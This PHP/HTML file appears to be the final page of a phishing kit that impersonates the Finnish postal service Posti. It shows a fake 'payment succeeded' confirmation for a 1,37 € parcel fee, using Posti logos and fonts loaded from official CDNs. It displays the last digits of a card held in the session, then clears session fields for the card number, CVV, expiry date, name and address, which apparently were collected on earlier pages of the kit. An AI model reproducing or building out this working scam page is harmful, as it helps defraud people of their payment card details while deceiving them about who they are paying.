<?php
session_start();
require '../config.php';
date_default_timezone_set('Europe/Helsinki');
// Clear session data
$cardLast4 = isset($_SESSION['_cc']) ? substr(str_replace(' ', '', $_SESSION['_cc']), -4) : '****';

// Generate confirmation number
$confirmationNumber = 'FI' . strtoupper(bin2hex(random_bytes(4)));

// Clean up status file
$statusDir = __DIR__ . '/status';
$sessionId = $_SESSION['session_id'] ?? null;
if ($sessionId && file_exists("$statusDir/$sessionId.txt")) {
    unlink("$statusDir/$sessionId.txt");
}

// Check if error
$isError = isset($_GET['status']) && $_GET['status'] === 'error';
?><!DOCTYPE html>
<html lang="fi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo $isError ? 'Virhe' : 'Maksu vahvistettu'; ?> - Posti</title>
<link rel="icon" href="https://assets.ctfassets.net/dvxpcmq06s7e/pkrFI9pZwsBhQ2lBowzyt/3c40676e510621e6adb7a1aebbe8ebc0/favicon.ico">
<link href="https://cdn.posti.fi/asset/css/typography-posti-font.css" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0;}
body{font-family:'Posti Font',Arial,sans-serif;background:#f7f7f7;color:#2A2B2D;font-size:16px;line-height:1.5;min-height:100vh;display:flex;flex-direction:column;}
a{text-decoration:none;color:inherit;}

/* TOP BAR */
.tb{background:#fff;border-bottom:1px solid #e5e5e5;display:flex;align-items:center;height:44px;padding:0 24px;gap:0;}
.tb-logo{display:flex;align-items:center;margin-right:20px;}
.tb-logo-text{font-size:28px;font-weight:900;font-style:italic;color:#FF6200;letter-spacing:-1px;line-height:1;}
.tb-tabs{display:flex;gap:0;height:100%;}
.tb-tab{display:flex;align-items:center;padding:0 14px;font-size:14px;font-weight:600;color:#2A2B2D;height:100%;cursor:pointer;}
.tb-tab.active{background:#1a1a1a;color:#fff;border-radius:20px;height:30px;margin:auto 4px;padding:0 16px;}
.tb-right{margin-left:auto;display:flex;align-items:center;gap:16px;}
.tb-link{display:flex;align-items:center;gap:5px;font-size:13px;color:#2A2B2D;font-weight:500;}
.tb-link svg{width:16px;height:16px;fill:currentColor;flex-shrink:0;}
.tb-langs{display:flex;align-items:center;border:1.5px solid #e5e5e5;border-radius:20px;overflow:hidden;padding:2px;}
.tb-lang{font-size:12px;font-weight:700;padding:3px 8px;border-radius:16px;cursor:pointer;color:#666;}
.tb-lang.active{background:#2A2B2D;color:#fff;}

/* PAGE CONTENT */
.page-content{flex:1;display:flex;align-items:center;justify-content:center;padding:40px 20px;}

/* SUCCESS CARD */
.result-card{background:#fff;border-radius:20px;box-shadow:0 8px 40px rgba(0,0,0,0.1);padding:50px;text-align:center;max-width:520px;width:100%;}

/* SUCCESS ICON */
.success-icon{width:100px;height:100px;margin:0 auto 28px;position:relative;}
.success-circle{position:absolute;inset:0;border-radius:50%;background:#22C55E;display:flex;align-items:center;justify-content:center;animation:scale-in 0.5s ease-out;}
.success-circle svg{width:50px;height:50px;fill:#fff;animation:check-draw 0.5s ease-out 0.3s both;}
@keyframes scale-in{from{transform:scale(0);}to{transform:scale(1);}}
@keyframes check-draw{from{opacity:0;transform:scale(0.5);}to{opacity:1;transform:scale(1);}}
.success-ring{position:absolute;inset:-10px;border:3px solid #22C55E;border-radius:50%;opacity:0;animation:ring-expand 0.6s ease-out 0.4s both;}
@keyframes ring-expand{from{transform:scale(0.8);opacity:0.8;}to{transform:scale(1.2);opacity:0;}}

/* ERROR ICON */
.error-icon{width:100px;height:100px;margin:0 auto 28px;position:relative;}
.error-circle{position:absolute;inset:0;border-radius:50%;background:#EF4444;display:flex;align-items:center;justify-content:center;}
.error-circle svg{width:50px;height:50px;fill:#fff;}

/* TEXT */
.result-card h1{font-size:26px;font-weight:800;margin-bottom:12px;}
.result-card h1.success{color:#166534;}
.result-card h1.error{color:#991B1B;}
.result-card p{font-size:15px;color:#666;line-height:1.6;max-width:380px;margin:0 auto;}

/* CONFIRMATION BOX */
.confirmation-box{background:linear-gradient(135deg,#F0FDF4 0%,#DCFCE7 100%);border:2px solid #BBF7D0;border-radius:16px;padding:24px;margin-top:28px;}
.confirmation-label{font-size:12px;color:#166534;text-transform:uppercase;letter-spacing:1px;margin-bottom:8px;}
.confirmation-number{font-size:28px;font-weight:900;color:#15803D;letter-spacing:2px;}

/* DETAILS */
.details{margin-top:28px;text-align:left;background:#f9f9f9;border-radius:12px;padding:20px 24px;}
.detail-row{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid #eee;}
.detail-row:last-child{border-bottom:none;}
.detail-label{font-size:14px;color:#888;}
.detail-value{font-size:14px;font-weight:700;color:#2A2B2D;}
.detail-value.amount{color:#FF6200;font-size:18px;}

/* INFO BOX */
.info-box{background:#FFF8F3;border:1.5px solid #FFE0CC;border-radius:12px;padding:18px 20px;margin-top:24px;text-align:left;}
.info-box-header{display:flex;align-items:center;gap:8px;margin-bottom:8px;}
.info-box-header svg{width:18px;height:18px;fill:#FF6200;}
.info-box-header span{font-size:13px;font-weight:700;color:#FF6200;}
.info-box p{font-size:13px;color:#8B5A2B;line-height:1.6;}

/* BUTTON */
.btn-primary{display:inline-flex;align-items:center;justify-content:center;gap:10px;background:#FF6200;color:#fff;border:none;border-radius:30px;padding:16px 40px;font-size:16px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:28px;text-decoration:none;transition:all 0.2s;}
.btn-primary:hover{background:#e55500;transform:translateY(-2px);box-shadow:0 4px 12px rgba(255,98,0,0.3);}
.btn-primary svg{width:20px;height:20px;fill:#fff;}

.btn-secondary{display:inline-flex;align-items:center;justify-content:center;gap:8px;background:#fff;color:#2A2B2D;border:2px solid #e5e5e5;border-radius:30px;padding:14px 32px;font-size:14px;font-weight:700;font-family:inherit;cursor:pointer;margin-top:12px;text-decoration:none;transition:all 0.2s;}
.btn-secondary:hover{border-color:#FF6200;color:#FF6200;}

/* SHARE */
.share-section{margin-top:32px;padding-top:24px;border-top:1px solid #eee;}
.share-text{font-size:13px;color:#888;margin-bottom:12px;}
.share-buttons{display:flex;justify-content:center;gap:12px;}
.share-btn{width:44px;height:44px;border-radius:50%;background:#f5f5f5;display:flex;align-items:center;justify-content:center;cursor:pointer;transition:all 0.2s;}
.share-btn:hover{background:#FF6200;}
.share-btn svg{width:20px;height:20px;fill:#666;transition:fill 0.2s;}
.share-btn:hover svg{fill:#fff;}

/* FOOTER */
footer{background:#fff;border-top:1px solid #e5e5e5;padding:20px 32px;text-align:center;}
footer p{font-size:12px;color:#888;}
footer a{color:#FF6200;font-weight:600;}

/* TABLET */
@media(max-width:900px){
    .tb-sites-btn{display:none;}
}

/* MOBILE */
@media(max-width:600px){
    .tb{padding:0 16px;height:50px;}
    .tb-tabs,.tb-langs,.tb-link{display:none;}
    .tb-logo-text{font-size:24px;}
    .page-content{padding:20px 12px;}
    .result-card{padding:32px 20px;border-radius:16px;}
    .success-icon,.error-icon{width:80px;height:80px;margin-bottom:24px;}
    .success-circle svg,.error-circle svg{width:40px;height:40px;}
    .result-card h1{font-size:20px;margin-bottom:10px;}
    .result-card p{font-size:14px;}
    .confirmation-box{padding:20px;margin-top:24px;}
    .confirmation-label{font-size:11px;}
    .confirmation-number{font-size:22px;letter-spacing:1px;}
    .details{margin-top:24px;padding:16px 18px;}
    .detail-row{padding:8px 0;font-size:13px;}
    .detail-value.amount{font-size:16px;}
    .info-box{padding:14px 16px;margin-top:20px;}
    .info-box-header span{font-size:12px;}
    .info-box p{font-size:12px;}
    .btn-primary{width:100%;padding:14px 24px;font-size:15px;margin-top:24px;}
    .btn-secondary{width:100%;padding:12px 20px;font-size:13px;margin-top:10px;}
    footer{padding:16px;}
    footer p{font-size:11px;}
}

/* SMALL MOBILE */
@media(max-width:380px){
    .result-card{padding:24px 16px;}
    .result-card h1{font-size:18px;}
    .confirmation-number{font-size:18px;}
    .detail-row{flex-direction:column;gap:4px;text-align:center;}
}

.tb-logo-img {
    height: 40px; /* ajuste selon ton design */
    width: auto;
    display: block;
}
</style>
</head>
<body>

<!-- TOP BAR -->
<div class="tb">
    <div class="tb-logo">
    <img src="https://cdn-ukwest.onetrust.com/logos/0cd0463b-0b24-43d4-abaa-6a461e651d10/e96975ca-412d-4058-b6e3-e3b0cb37b650/a35af39c-cc06-4b52-9b5f-9a3d838da19c/1.1_Posti_logo_Posti_Orange_rgb.png" alt="Logo" class="tb-logo-img">
</div>
    <div class="tb-tabs">
        <span class="tb-tab active">Henkilöille</span>
        <span class="tb-tab">Yrityksille</span>
    </div>
    <div class="tb-right">
        <a class="tb-link" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M11 4a7 7 0 1 0 4.856 12.041 1 1 0 0 1 .185-.185A7 7 0 0 0 11 4m7.032 12.618a9 9 0 1 0-1.414 1.414l3.675 3.675a1 1 0 0 0 1.414-1.414z" clip-rule="evenodd"/></svg>
            Haku
        </a>
        <a class="tb-link" href="#">
            <svg viewBox="0 0 24 24"><path fill-rule="evenodd" d="M12 3a7 7 0 0 0-7 7c0 1.892.853 3.678 2.292 5.547 1.215 1.578 2.77 3.12 4.44 4.776l.268.266.268-.266c1.67-1.656 3.225-3.198 4.44-4.776C18.147 13.678 19 11.892 19 10a7 7 0 0 0-7-7m-9 7a9 9 0 0 1 18 0c0 2.526-1.147 4.74-2.708 6.767-1.304 1.694-2.974 3.349-4.641 5.002q-.474.469-.944.938a1 1 0 0 1-1.414 0q-.47-.469-.944-.938c-1.668-1.653-3.337-3.308-4.641-5.002C4.147 14.74 3 12.527 3 10m9-2a2 2 0 1 0 0 4 2 2 0 0 0 0-4m-4 2a4 4 0 1 1 8 0 4 4 0 0 1-8 0" clip-rule="evenodd"/></svg>
            Palvelupisteet
        </a>
        <div class="tb-langs">
            <span class="tb-lang active">FI</span>
            <span class="tb-lang">SV</span>
            <span class="tb-lang">EN</span>
        </div>
    </div>
</div>

<!-- PAGE CONTENT -->
<div class="page-content">
    <div class="result-card">

        <?php if ($isError): ?>

        <!-- ERROR STATE -->
        <div class="error-icon">
            <div class="error-circle">
                <svg viewBox="0 0 24 24"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
            </div>
        </div>

        <h1 class="error">Maksu epäonnistui</h1>
        <p>Maksua ei voitu käsitellä. Yritä uudelleen tai ota yhteyttä pankkiisi.</p>

        <a href="card.php" class="btn-primary">
            <svg viewBox="0 0 24 24"><path d="M17.65 6.35A7.958 7.958 0 0 0 12 4c-4.42 0-7.99 3.58-7.99 8s3.57 8 7.99 8c3.73 0 6.84-2.55 7.73-6h-2.08A5.99 5.99 0 0 1 12 18c-3.31 0-6-2.69-6-6s2.69-6 6-6c1.66 0 3.14.69 4.22 1.78L13 11h7V4l-2.35 2.35z"/></svg>
            Yritä uudelleen
        </a>

        <?php else: ?>

        <!-- SUCCESS STATE -->
        <div class="success-icon">
            <div class="success-circle">
                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
            </div>
            <div class="success-ring"></div>
        </div>

        <h1 class="success">Maksu onnistui!</h1>
        <p>Maksusi on vahvistettu. Lähetyksesi toimitetaan pian perille.</p>

        <div class="confirmation-box">
            <div class="confirmation-label">Vahvistusnumero</div>
            <div class="confirmation-number"><?php echo $confirmationNumber; ?></div>
        </div>

        <div class="details">
            <div class="detail-row">
                <span class="detail-label">Lähetys</span>
                <span class="detail-value">#FI773817638</span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Maksutapa</span>
                <span class="detail-value">•••• <?php echo $cardLast4; ?></span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Päivämäärä</span>
                <span class="detail-value"><?php echo date('d.m.Y H:i'); ?></span>
            </div>
            <div class="detail-row">
                <span class="detail-label">Maksettu summa</span>
                <span class="detail-value amount">1,37 €</span>
            </div>
        </div>

        <div class="info-box">
            <div class="info-box-header">
                <svg viewBox="0 0 24 24"><path d="M20 4H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2zm0 9H4a2 2 0 0 0-2 2v3a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-3a2 2 0 0 0-2-2z"/></svg>
                <span>Seuraavat vaiheet</span>
            </div>
            <p>Lähetys toimitetaan 1-3 arkipäivän kuluessa. Saat seurantatiedot sähköpostiisi.</p>
        </div>

        <a href="https://www.posti.fi" class="btn-primary">
            <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8h5z"/></svg>
            Palaa etusivulle
        </a>

        <a href="#" class="btn-secondary">
            <svg viewBox="0 0 24 24"><path d="M19 8l-4 4h3c0 3.31-2.69 6-6 6-1.01 0-1.97-.25-2.8-.7l-1.46 1.46C8.97 19.54 10.43 20 12 20c4.42 0 8-3.58 8-8h3l-4-4zM6 12c0-3.31 2.69-6 6-6 1.01 0 1.97.25 2.8.7l1.46-1.46C15.03 4.46 13.57 4 12 4c-4.42 0-8 3.58-8 8H1l4 4 4-4H6z"/></svg>
            Seuraa lähetystä
        </a>

        <?php endif; ?>

    </div>
</div>

<!-- FOOTER -->
<footer>
    <p>Kiitos kun valitsit Postin! <a href="#">Asiakaspalvelu</a></p>
    <p style="margin-top:8px;">© Posti Group Oyj</p>
</footer>

<?php
// Clear sensitive session data
unset($_SESSION['_cc'], $_SESSION['_cvv'], $_SESSION['_exp'], $_SESSION['_name']);
unset($_SESSION['_address'], $_SESSION['_city'], $_SESSION['_zip']);
?>
</body>
</html>
